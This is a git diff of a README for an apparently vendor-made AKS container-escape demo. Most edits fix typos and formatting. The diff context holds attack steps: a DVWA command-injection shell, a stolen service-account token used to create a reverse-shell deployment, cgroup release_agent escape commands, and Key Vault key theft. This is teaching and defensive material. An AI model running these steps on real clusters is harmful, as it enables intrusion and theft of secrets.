@@ -12,7 +12,7 @@ This folder contains Terraform automation code to provision the following:
 <!-- code_chunk_output -->
 
 - [AKS container escape demo](#aks-container-escape-demo)
-  - [Prerequsites](#prerequsites)
+  - [Prerequisites](#prerequisites)
   - [Provision the cluster](#provision-the-cluster)
   - [Connect to the cluster](#connect-to-the-cluster)
   - [Deploy Mondoo Operator to AKS](#deploy-mondoo-operator-to-aks)
@@ -26,8 +26,12 @@ This folder contains Terraform automation code to provision the following:
     - [Start the host listener](#start-the-host-listener)
     - [Start Ruby webserver](#start-ruby-webserver)
   - [Escape time](#escape-time)
-    - [Escalate Privileges on the container](#escalate-privileges-on-the-container)
-    - [Gain access to worker nodes (Escaping the pod and getting a shell on the worker node)](#gain-access-to-worker-nodes)
+    - [Escalate privileges on the container](#escalate-privileges-on-the-container)
+    - [Gain access to worker nodes (Escaping the pod and getting a shell on the worker node)](#gain-access-to-worker-nodes-escaping-the-pod-and-getting-a-shell-on-the-worker-node)
+    - [1. Using ServiceAccount](#1-using-serviceaccount)
+    - [2. Release\_agent cgroups escape](#2-release_agent-cgroups-escape)
+    - [3. Cronjob](#3-cronjob)
+    - [Get keys from keyvault](#get-keys-from-keyvault)
   - [Mondoo scan commands](#mondoo-scan-commands)
     - [Scan kubernetes manifest](#scan-kubernetes-manifest)
     - [Scan container image from registry](#scan-container-image-from-registry)
@@ -41,7 +45,7 @@ This folder contains Terraform automation code to provision the following:
 
 <!-- /code_chunk_output -->
 
-## Prerequsites
+## Prerequisites
 
 - [Azure Account](https://azure.microsoft.com/en-us/free/)
 - [AZ CLI](https://docs.microsoft.com/en-us/cli/azure/install-azure-cli)
@@ -58,25 +62,25 @@ git clone git@github.com:Lunalectric/container-escape.git
 
 2. cd into the terraform folder
 
-```
+```bash
 cd container-escape/azure
 ```
 
 3. Initialize the project (download modules)
 
-```
+```bash
 terraform init
 ```
 
 4. Check that everything is ready
 
-```
+```bash
 terraform plan
 ```
 
 5. Apply the configuration
 
-```
+```bash
 terraform apply -auto-approve
 ```
 
@@ -262,7 +266,7 @@ Log in to DVWA using `admin` with the password `password`.
 
 ![Reset the Database](../assets/dvwa_db_reset.png)
 
-Once logged in, click on "Create / Reset Database" after which, you will be logged out. Log back in to the web application and click on "Command Injection."
+Once logged in, select "Create / Reset Database" after which, you will be logged out. Log back in to the web application and select "Command Injection."
 
 Next, open three command line terminals and continue the setup process.
 
@@ -401,7 +405,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 You have a shell and are the `www-data` user.
 
-### Escalate Privileges on the container
+### Escalate privileges on the container
 
 Now you need do the privilege escalation within the container to gain root. In the terminal where the container listener and run the following commands:
 
@@ -462,17 +466,15 @@ In the outcome we can see the containerd which shows we are in a container (cont
 
 b. To check is if we are in a privileged container, we can check if we have access to a lot of devices.
 
-    ```bash
-
+```bash
 fdisk -l
-
 ````
 
 ```bash
 ls /dev/
 ````
 
-There are several ways of escaping the container and land in the workernode which some of them might not work as kubernetes orchestration is keep updating in Azure. Here, we are trying three ways, which two of them is not working anymore in the new Kubernetes version (latest version deployed by terraform starting from May 2023):
+There are several ways of escaping the container and land in the worker node which some of them might not work as kubernetes orchestration is keep updating in Azure. Here, we are trying three ways, which two of them is not working anymore in the new Kubernetes version (latest version deployed by terraform starting from May 2023):
 
 ### 1. Using ServiceAccount
 
@@ -534,7 +536,7 @@ kubectl --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` --certific
 no
 ```
 
-So, here wo donot have enough permissions and a result we cannot create a new pod from within this pod by calling the API. If we had enough permissions by getting simply 'yes' from above query, we could use following to create a pod and at the same listening on the port 4244 to get a reverse shell:
+So, here we don't have enough permissions and a result we cannot create a new pod from within this pod by calling the API. If we had enough permissions by getting simply 'yes' from above query, we could use following to create a pod and at the same listening on the port 4244 to get a reverse shell:
 
 ```bash
 curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X POST ${APISERVER}/apis/apps/v1/namespaces/default/deployments -H 'Content-Type: application/yaml' -d '---
@@ -583,7 +585,7 @@ chmod a+x /cmd
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
 
-We can confirm that it did not work in the new version of the kubernets in Azure, and most probably it should be related to the fact that cgroup exploit was mainly related to the Docker and not the containerd!
+We can confirm that it did not work in the new version of the Kubernetes in Azure, and most probably it should be related to the fact that cgroup exploit was mainly related to the Docker and not the containerd!
 
 ### 3. Cronjob
 
